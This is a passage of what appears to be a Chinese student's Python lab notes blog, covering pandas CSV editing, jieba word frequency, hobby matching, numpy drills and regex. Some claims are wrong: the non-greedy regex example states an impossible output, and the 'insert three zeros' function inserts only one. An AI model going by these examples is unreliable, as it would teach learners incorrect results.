class="line"></span><br><span class="line">    # 找出出现次数最多的数字</span><br><span class="line">    max_count = max(count_dict.values())</span><br><span class="line">    most_frequent_numbers = [number for number, count in count_dict.items() if count == max_count]</span><br><span class="line"></span><br><span class="line">    # 打印出现次数最多的数字和次数</span><br><span class="line">    print(&quot;出现次数最多的数字和它出现的次数是:&quot;)</span><br><span class="line">    for number in most_frequent_numbers:</span><br><span class="line">        print(f&quot;&#123;number&#125; 出现 &#123;max_count&#125; 次&quot;)</span><br><span class="line"></span><br><span class="line"># 示例输入</span><br><span class="line">input_string = &quot;2,3,3,2,4,5,6,6,7,8&quot;</span><br><span class="line">count_numbers(input_string)</span><br></pre></td></tr></table></figure></div>

<h3 id="找数"><a href="#找数" class="headerlink" title="找数"></a>找数</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def My_Search(lst, target):</span><br><span class="line">    left, right = 0, len(lst) - 1</span><br><span class="line">    while left &lt;= right:</span><br><span class="line">        mid = (left + right) // 2</span><br><span class="line">        if lst[mid] == target:</span><br><span class="line">            return mid</span><br><span class="line">        elif lst[mid] &lt; target:</span><br><span class="line">            left = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right = mid - 1</span><br><span class="line">    return &quot;未查找到该数&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 示例用法</span><br><span class="line">lst1 = [12, 15, 33, 34, 35, 39, 42, 45, 45, 49]</span><br><span class="line">lst2 = [10, 11, 15, 23, 29, 31, 42, 46, 48, 49]</span><br><span class="line"></span><br><span class="line">print(My_Search(lst1, 33))  # 输出: 2</span><br><span class="line">print(My_Search(lst2, 33))  # 输出: 未查找到该数</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="斐波那契"><a href="#斐波那契" class="headerlink" title="斐波那契"></a>斐波那契</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fib(n):</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 0</span><br><span class="line">    elif n == 1:</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return fib(n - 1) + fib(n - 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def print_fibonacci():</span><br><span class="line">    for i in range(20):</span><br><span class="line">        # 计算斐波那契数</span><br><span class="line">        num = fib(i)</span><br><span class="line">        # 打印，宽度为5，右对齐</span><br><span class="line">        print(f&quot;&#123;num:&gt;5&#125;&quot;, end=&quot; &quot;)</span><br><span class="line">        # 每10个数换行</span><br><span class="line">        if (i + 1) % 10 == 0:</span><br><span class="line">            print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_fibonacci()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fn(x, y):</span><br><span class="line">    return x * 10 + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [1, 3, 5, 7, 9]</span><br><span class="line">result = reduce(fn, a)</span><br><span class="line">print(result)  # 输出: 13579</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="正负分离"><a href="#正负分离" class="headerlink" title="正负分离"></a>正负分离</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 输入一组整数</span><br><span class="line">input_numbers = input(&quot;输入一组有正有负的整数，用逗号隔开:&quot;).split(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line"># 将输入的字符串转换为整数</span><br><span class="line">numbers = list(map(int, input_numbers))</span><br><span class="line"></span><br><span class="line"># 使用 lambda 和 filter 过滤出大于零的元素</span><br><span class="line">positive_numbers = list(filter(lambda x: x &gt; 0, numbers))</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(positive_numbers)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实验-10"><a href="#实验-10" class="headerlink" title="实验 10"></a>实验 10</h2><p>pandas 实现 csv 的增删改查</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> tabulate <span class="keyword">import</span> tabulate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 CSV 文件</span></span><br><span class="line">df = pd.read_csv(<span class="string">&quot;pizza_sales.csv&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询数据：查询所有 pizza_name 为 &quot;Margherita&quot; 的订单</span></span><br><span class="line">margherita_orders = df[df[<span class="string">&quot;pizza_name&quot;</span>] == <span class="string">&quot;Margherita&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Margherita 订单:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tabulate(margherita_orders, headers=<span class="string">&quot;keys&quot;</span>, tablefmt=<span class="string">&quot;pretty&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加数据：创建新订单数据</span></span><br><span class="line">new_order = &#123;</span><br><span class="line">    <span class="string">&quot;pizza_id&quot;</span>: <span class="number">101</span>,</span><br><span class="line">    <span class="string">&quot;order_id&quot;</span>: <span class="number">202</span>,</span><br><span class="line">    <span class="string">&quot;pizza_name_id&quot;</span>: <span class="number">303</span>,</span><br><span class="line">    <span class="string">&quot;quantity&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;order_date&quot;</span>: <span class="string">&quot;2023-10-01&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order_time&quot;</span>: <span class="string">&quot;12:00&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unit_price&quot;</span>: <span class="number">15.0</span>,</span><br><span class="line">    <span class="string">&quot;total_price&quot;</span>: <span class="number">30.0</span>,</span><br><span class="line">    <span class="string">&quot;pizza_size&quot;</span>: <span class="string">&quot;Medium&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pizza_category&quot;</span>: <span class="string">&quot;Vegetarian&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pizza_ingredients&quot;</span>: <span class="string">&quot;Tomato, Cheese, Basil&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pizza_name&quot;</span>: <span class="string">&quot;Margherita&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加新订单</span></span><br><span class="line">df = pd.concat([df, pd.DataFrame([new_order])], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n添加新订单后的数据:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tabulate(df, headers=<span class="string">&quot;keys&quot;</span>, tablefmt=<span class="string">&quot;pretty&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据：删除 order_id 为 202 的订单</span></span><br><span class="line">df = df[df[<span class="string">&quot;order_id&quot;</span>] != <span class="number">202</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n删除 order_id 为 202 的订单后的数据:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tabulate(df, headers=<span class="string">&quot;keys&quot;</span>, tablefmt=<span class="string">&quot;pretty&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新数据：将 order_id 为 101 的订单的 quantity 更新为 3</span></span><br><span class="line">df.loc[df[<span class="string">&quot;order_id&quot;</span>] == <span class="number">101</span>, <span class="string">&quot;quantity&quot;</span>] = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n更新 order_id 为 101 的订单的数量后的数据:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tabulate(df, headers=<span class="string">&quot;keys&quot;</span>, tablefmt=<span class="string">&quot;pretty&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存修改后的数据到 CSV 文件</span></span><br><span class="line">df.to_csv(<span class="string">&quot;pizza_sales.csv&quot;</span>, index=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-0331e7c56d87701710d22381ce636e07.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-331eda083261630f6ef17159b492652d.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-9874008e81469d8c70f7576444596289.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-ce3abe304a50dd29804b194143ed9298.png"
                      alt="img"
                ></p>
<h2 id="实验-11"><a href="#实验-11" class="headerlink" title="实验 11"></a>实验 11</h2><h3 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba.posseg <span class="keyword">as</span> pseg</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取txt全部文字</span></span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">&quot;射雕英雄传.txt&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">content = fin.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用jieba分词并进行词性标注</span></span><br><span class="line">words = pseg.cut(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取人名</span></span><br><span class="line">names = [word <span class="keyword">for</span> word, flag <span class="keyword">in</span> words <span class="keyword">if</span> flag == <span class="string">&quot;nr&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计人名词频</span></span><br><span class="line">name_freq = pd.Series(names).value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印前10个高频人名</span></span><br><span class="line"><span class="built_in">print</span>(name_freq.head(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制云图</span></span><br><span class="line">wc = WordCloud(font_path=<span class="string">&quot;simhei.ttf&quot;</span>, width=<span class="number">800</span>, height=<span class="number">600</span>, background_color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">wc.generate_from_frequencies(name_freq)</span><br><span class="line">wc.to_file(<span class="string">&quot;name_cloud.png&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-ec8d044601c9b72b5c54853c3dace8f1.png"
                      alt="img"
                ></p>
<h3 id="兴趣推荐"><a href="#兴趣推荐" class="headerlink" title="兴趣推荐"></a>兴趣推荐</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&quot;./员工数据表.xlsx&quot;</span>, engine=<span class="string">&quot;openpyxl&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(df.head())  <span class="comment"># 打印前几行数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询男女，只保留编号、姓名、性别、部门、爱好的5列</span></span><br><span class="line">df_boy = df.loc[df[<span class="string">&quot;性别&quot;</span>] == <span class="string">&quot;男&quot;</span>, [<span class="string">&quot;编号&quot;</span>, <span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;部门&quot;</span>, <span class="string">&quot;爱好&quot;</span>]]</span><br><span class="line">df_girl = df.loc[df[<span class="string">&quot;性别&quot;</span>] == <span class="string">&quot;女&quot;</span>, [<span class="string">&quot;编号&quot;</span>, <span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;部门&quot;</span>, <span class="string">&quot;爱好&quot;</span>]]</span><br><span class="line"><span class="built_in">print</span>(df_boy.head(<span class="number">3</span>))  <span class="comment"># 打印男生数据的前3行</span></span><br><span class="line"><span class="built_in">print</span>(df_girl.head(<span class="number">3</span>))  <span class="comment"># 打印女生数据的前3行</span></span><br><span class="line"></span><br><span class="line">df_merge = pd.merge(left=df_boy, right=df_girl, how=<span class="string">&quot;cross&quot;</span>, suffixes=(<span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;_girl&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(df_merge.head())  <span class="comment"># 打印合并后的数据前几行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(df_boy))  <span class="comment"># 打印男生数据的长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(df_girl))  <span class="comment"># 打印女生数据的长度</span></span><br><span class="line"><span class="built_in">print</span>(df_merge.shape)  <span class="comment"># 打印合并数据的形状</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_score</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="comment"># 使用交集和并集计算相似度</span></span><br><span class="line">    hobbies_boy = <span class="built_in">set</span>(row[<span class="string">&quot;爱好_boy&quot;</span>].split(<span class="string">&quot;|&quot;</span>))</span><br><span class="line">    hobbies_girl = <span class="built_in">set</span>(row[<span class="string">&quot;爱好_girl&quot;</span>].split(<span class="string">&quot;|&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(hobbies_boy &amp; hobbies_girl) / <span class="built_in">len</span>(hobbies_boy | hobbies_girl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">df_merge[<span class="string">&quot;相似度&quot;</span>] = df_merge.apply(compute_score, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df_merge.sample(<span class="number">6</span>))  <span class="comment"># 随机打印6行数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 男编号查女性列表</span></span><br><span class="line">number = <span class="string">&quot;S00004&quot;</span></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    df_merge[df_merge[<span class="string">&quot;编号_boy&quot;</span>] == number]</span><br><span class="line">    .sort_values(by=<span class="string">&quot;相似度&quot;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line">    .head(<span class="number">3</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 女编号查男性列表</span></span><br><span class="line">number = <span class="string">&quot;S00093&quot;</span></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    df_merge[df_merge[<span class="string">&quot;编号_girl&quot;</span>] == number]</span><br><span class="line">    .sort_values(by=<span class="string">&quot;相似度&quot;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line">    .head(<span class="number">3</span>)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-0e63b3004f1246f71988203401f3ad75.png"
                      alt="img"
                ></p>
<h2 id="实验-12"><a href="#实验-12" class="headerlink" title="实验 12"></a>实验 12</h2><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习 1"></a>练习 1</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个长度为10的一维全为0的ndarray对象，然后让第5个元素等于1</span></span><br><span class="line">a = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个元素从10到49的ndarray对象</span></span><br><span class="line">b = np.array(<span class="built_in">range</span>(<span class="number">10</span>, <span class="number">50</span>))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转数组</span></span><br><span class="line">c = b[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用随机创建一个10*10的ndarray对象，并打印最大最小元素</span></span><br><span class="line">d = np.random.random((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(d.<span class="built_in">max</span>())</span><br><span class="line"><span class="built_in">print</span>(d.<span class="built_in">min</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个10*10的ndarray对象，且矩阵边框为1，内部为0</span></span><br><span class="line">e = np.ones((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">e[<span class="number">1</span>:-<span class="number">1</span>, <span class="number">1</span>:-<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建每一行都是从0到4的5*5的ndarray对象</span></span><br><span class="line">f = np.array([np.arange(<span class="number">5</span>)] * <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个范围在(0,1)之间的长度为12的等差数列</span></span><br><span class="line">g = np.linspace(<span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个长度为10的随机数组并排序</span></span><br><span class="line">h = np.random.random(<span class="number">10</span>)</span><br><span class="line">h.sort()</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个长度为10的随机数组并将最大值替换为0</span></span><br><span class="line">i = np.random.randint(<span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">i[i.argmax()] = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习 2"></a>练习 2</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定一个4维矩阵，求最后两维的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum_last_two_dimensions</span>(<span class="params">matrix</span>):</span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">sum</span>(matrix, axis=(-<span class="number">1</span>, -<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定一个数组12345，在每个元素之间插入三个0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert_zeros</span>(<span class="params">array</span>):</span><br><span class="line">    <span class="keyword">return</span> np.insert(array, np.arange(<span class="number">1</span>, <span class="built_in">len</span>(array)), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定一个二维矩阵，交换其中两行元素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_rows</span>(<span class="params">matrix, row1, row2</span>):</span><br><span class="line">    matrix[[row1, row2]] = matrix[[row2, row1]]</span><br><span class="line">    <span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个100000长度的随机数组</span></span><br><span class="line">random_array = np.random.rand(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一：使用for循环对数组求三次方</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">cubed_array_loop = np.array([x**<span class="number">3</span> <span class="keyword">for</span> x <span class="keyword">in</span> random_array])</span><br><span class="line">loop_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：使用numpy对数组求三次方</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">cubed_array_numpy = np.power(random_array, <span class="number">3</span>)</span><br><span class="line">numpy_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较所用时间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;使用for循环求三次方的时间: <span class="subst">&#123;loop_time&#125;</span>秒&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;使用numpy求三次方的时间: <span class="subst">&#123;numpy_time&#125;</span>秒&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个5 * 3随机矩阵和一个3 * 2随机矩阵</span></span><br><span class="line">matrix_5x3 = np.random.rand(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">matrix_3x2 = np.random.rand(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求矩阵积</span></span><br><span class="line">matrix_product = np.dot(matrix_5x3, matrix_3x2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5x3矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(matrix_5x3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;3x2矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(matrix_3x2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;矩阵积:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(matrix_product)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 矩阵的每一行的元素都减去该行的平均值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subtract_row_mean</span>(<span class="params">matrix</span>):</span><br><span class="line">    row_means = matrix.mean(axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> matrix - row_means</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印出以下矩阵（要求使用np.zeros创建8*8的矩阵）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_checkerboard</span>():</span><br><span class="line">    checkerboard = np.zeros((<span class="number">8</span>, <span class="number">8</span>), dtype=<span class="built_in">int</span>)</span><br><span class="line">    checkerboard[<span class="number">1</span>::<span class="number">2</span>, ::<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    checkerboard[::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> checkerboard</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则化一个5*5随机矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_matrix</span>(<span class="params">matrix</span>):</span><br><span class="line">    min_val = matrix.<span class="built_in">min</span>()</span><br><span class="line">    max_val = matrix.<span class="built_in">max</span>()</span><br><span class="line">    <span class="keyword">return</span> (matrix - min_val) / (max_val - min_val)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">matrix = np.random.randint(<span class="number">0</span>, <span class="number">100</span>, (<span class="number">5</span>, <span class="number">5</span>))</span><br><span class="line">normalized_matrix = normalize_matrix(matrix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(matrix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正则化后的矩阵:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(normalized_matrix)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="爬虫实验"><a href="#爬虫实验" class="headerlink" title="爬虫实验"></a>爬虫实验</h2><p>地址：<a href="https://blog.w1ndys.top/posts/6d67d75.html">爬虫实验</a></p>
<h2 id="专项知识点-正则表达式"><a href="#专项知识点-正则表达式" class="headerlink" title="专项知识点-正则表达式"></a>专项知识点-正则表达式</h2><ol>
<li><p><strong>匹配 “abbbbbbbbbc” 中的 “abbbbbbbb”（从贪婪非贪婪角度分析）</strong><br>正则表达式可以通过贪婪和非贪婪方式进行匹配，分析如下：</p>
<ul>
<li><p><strong>贪婪模式</strong>：使用 <code>.*</code>，匹配尽可能多的字符。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;abbbbbbbbbc&quot;</span></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&quot;ab.*c&quot;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.group())  <span class="comment"># 输出: abbbbbbbbbc</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>非贪婪模式</strong>：使用 <code>.*?</code>，尽量匹配少的字符。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;abbbbbbbbbc&quot;</span></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&quot;ab.*?c&quot;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.group())  <span class="comment"># 输出: abbbbbbbb</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>在贪婪模式下，<code>.*</code> 会尽量匹配多的字符，所以结果是 <code>abbbbbbbbbc</code>。而非贪婪模式下，<code>.*?</code> 会尽量匹配少的字符，所以结果是 <code>abbbbbbbb</code>。</p>
</li>
<li><p><strong>匹配以字母 “c” 开头的单词</strong><br>对于这个题目，正则表达式可以通过 <code>\bc\w*\b</code> 来匹配以字母 “c” 开头的单词，其中 <code>\b</code> 是单词边界，<code>\w*</code> 匹配零个或多个字母、数字或下划线。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">&quot;The cat sat on the mat and the rat chased the cat&quot;</span></span><br><span class="line">matches = re.findall(<span class="string">r&#x27;\bc\w*\b&#x27;</span>, content)</span><br><span class="line"><span class="built_in">print</span>(matches)  <span class="comment"># 输出: [&#x27;cat&#x27;, &#x27;chased&#x27;, &#x27;cat&#x27;]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>从 HTML 中提取包含 <code>class=&quot;active&quot;</code> 的列表项中的歌手名和歌曲名</strong><br>使用 <code>re.search</code> 查找符合 <code>class=&quot;active&quot;</code> 的 <code>li</code> 元素，并提取出歌手名和歌曲名。正则表达式可以使用捕获组来提取歌手名和歌曲名。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;&lt;div id=&quot;songs-list&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h2 class =&quot;title&quot;&gt;经典老歌&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;introduction&quot;&gt;</span></span><br><span class="line"><span class="string">经典老歌列表</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view=&quot;7&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;a href =&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一卢笑 &lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;a href =&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view =&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月 &lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;除慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li data-view=&quot;5&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;a href =&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt; 但愿人长久 &lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用正则表达式匹配 active 类的 &lt;li&gt; 中的歌手和歌曲名</span></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;&lt;li[^&gt;]*class=&quot;active&quot;[^&gt;]*&gt;.*?&lt;a[^&gt;]*singer=&quot;([^&quot;]*)&quot;[^&gt;]*&gt;(.*?)&lt;/a&gt;&#x27;</span>, 